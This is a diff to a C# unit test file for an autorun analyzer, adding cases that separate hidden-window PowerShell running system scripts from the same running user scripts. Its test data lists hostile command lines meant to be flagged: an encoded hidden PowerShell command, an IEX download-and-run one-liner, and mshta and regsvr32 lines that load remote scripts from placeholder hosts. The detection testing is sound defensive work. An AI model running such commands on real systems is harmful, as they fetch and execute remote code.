@@ -35,6 +35,7 @@ public class AutorunTests
 
     [Theory]
     [InlineData("powershell.exe -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA", true)]
+    [InlineData(@"powershell.exe -WindowStyle Hidden -File C:\Windows\System32\x.ps1", false)]
     [InlineData("powershell -NoProfile -Command \"IEX (New-Object Net.WebClient).DownloadString('http://x')\"", true)]
     [InlineData("mshta http://example.test/a.hta", true)]
     [InlineData(@"regsvr32 /s /n /u /i:http://x/a.sct scrobj.dll", true)]
@@ -105,4 +106,15 @@ public class AutorunTests
         var r = Assert.Single(AutorunAnalyzer.Analyze(Snapshot() with { Autoruns = Na<IReadOnlyList<AutorunEntry>>() }));
         Assert.Equal(CheckStatus.Unavailable, r.Status);
     }
+}
+
+public class PowerShellHiddenWindowTests
+{
+    [Fact]
+    public void HiddenWindow_WithSystemScript_IsNotSuspicious() =>
+        Assert.Null(CommandLine.SuspiciousPattern(@"""C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe"" -NonInteractive -NoProfile -WindowStyle Hidden ""& C:\Windows\system32\WindowsPowerShell\v1.0\Modules\SmbShare\DisableUnusedSmb1.ps1 -Scenario Client"""));
+
+    [Fact]
+    public void HiddenWindow_WithUserScript_IsSuspicious() =>
+        Assert.NotNull(CommandLine.SuspiciousPattern(@"powershell.exe -w hidden -File C:\Users\me\AppData\Roaming\x.ps1"));
 }
